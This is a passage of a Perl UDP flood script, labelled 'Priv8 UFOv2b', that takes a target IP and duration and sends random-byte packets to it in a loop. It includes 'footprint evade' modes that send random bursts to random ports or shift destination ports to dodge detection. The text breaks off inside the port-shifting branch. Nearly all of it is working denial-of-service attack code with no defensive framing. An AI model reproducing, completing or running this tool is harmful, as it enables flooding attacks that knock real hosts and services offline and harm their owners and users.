use Socket;
use strict;
 
if ($#ARGV != 2) {
  print " \n";

print "
               
Priv8 UFOv2b by Echo503

Use -> perl UFO.pl <IP> <TIME> <FOOTPRINTEVADE-MODE>

FOOTPRINT EVADE MODES:
  0) OFF
  1) ON [Rand Burst]
  2) ON [Dest Port shifting]
";
exit(1);
}
 
my ($ip,$time,$foot) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport,$hexed,$hexed1,$hexed2,$hexed3,$hexed4,$hexed5,$hexed6,$hexed7,$temp,$dnstemp,$footmode,$pps,$requiered,$burst_payload,$port_shifted);

my @hex = ("\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
 
my @ports = ("7","53","111","138","161","389","427","623","1194","5353");
$iaddr = inet_aton("$ip") or die "Imposible atacar a $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

if($foot == 0){
	$footmode = "OFF";
}
elsif($foot == 1){
	$footmode = "ON [Rand Burst]";
}
elsif($foot == 2){
	$footmode = "ON [Dest Port shifting]";
}
else{
	$footmode = "OFF";
}


 system("cls");

 print "[i] Footprint Evader: " . $footmode . "\r\n";
 
if($foot == 1){
	$requiered = int(rand(500000)+100000);
}
elsif($foot == 2){
	$requiered = int(rand(500000)+100000);
}

 print "[i] Attack started!\r\n";
 
for (;time() <= $endtime;) {

	$hexed = $hex[rand @hex];
	$hexed1 = $hex[rand @hex];
	$hexed2 = $hex[rand @hex];
	$hexed3 = $hex[rand @hex];
	$hexed4 = $hex[rand @hex];
	$hexed5 = $hex[rand @hex];
	$hexed6 = $hex[rand @hex];
	$hexed7 = $hex[rand @hex];
	
	$temp = int(rand(10)+1);	
	
	if($foot == 1 && $pps > $requiered){
		$requiered = int(rand(500000)+100000);
		$pps = 0;
		my $burstseq = int(rand(50000)+10000);
		print "[FootprintEvader] Sending " . $burstseq . " Burst packets!\r\n";
		$burst_payload =  $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex];
		for (my $i=0; $i < $burstseq; $i++) {
			send("flood", $burst_payload, 0, pack_sockaddr_in(int(rand(65535)+1), $iaddr));
		}
	}
	if($foot == 2 && $pps > $requiered){
		$requiered = int(rand(500000)+100000);
		$pps = 0;
		
